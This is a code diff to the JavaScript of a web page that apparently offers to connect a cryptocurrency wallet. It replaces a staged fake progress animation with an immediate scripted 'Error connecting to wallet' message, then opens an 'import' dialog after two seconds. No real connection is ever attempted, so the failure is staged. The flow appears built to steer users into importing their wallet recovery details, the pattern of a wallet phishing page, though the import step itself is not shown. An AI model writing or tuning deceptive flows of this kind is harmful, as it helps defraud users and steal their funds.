@@ -39,38 +39,17 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // Show connection steps
+    // Show connection steps with immediate error
     function showConnectionSteps() {
         stepsModal.classList.remove('hidden');
+        document.getElementById('step-title').textContent = 'Initializing';
+        document.getElementById('step-description').textContent = 'Error connecting to wallet...';
         
-        const steps = [
-            { title: 'Initializing', description: 'Trying to connect to wallet...', duration: 3000 },
-            { title: 'Connecting', description: 'Establishing secure connection...', duration: 3000 },
-            { title: 'Verifying', description: 'Verifying wallet credentials...', duration: 3000 },
-            { title: 'Error', description: 'Connection failed', duration: 1000 }
-        ];
-
-        let currentStep = 0;
-
-        function showStep() {
-            if (currentStep < steps.length) {
-                const step = steps[currentStep];
-                document.getElementById('step-title').textContent = step.title;
-                document.getElementById('step-description').textContent = step.description;
-                
-                setTimeout(() => {
-                    currentStep++;
-                    if (currentStep < steps.length) {
-                        showStep();
-                    } else {
-                        stepsModal.classList.add('hidden');
-                        showImportModal();
-                    }
-                }, step.duration);
-            }
-        }
-
-        showStep();
+        // Show error immediately, then move to import modal
+        setTimeout(() => {
+            stepsModal.classList.add('hidden');
+            showImportModal();
+        }, 2000);
     }
 
     // Show import modal
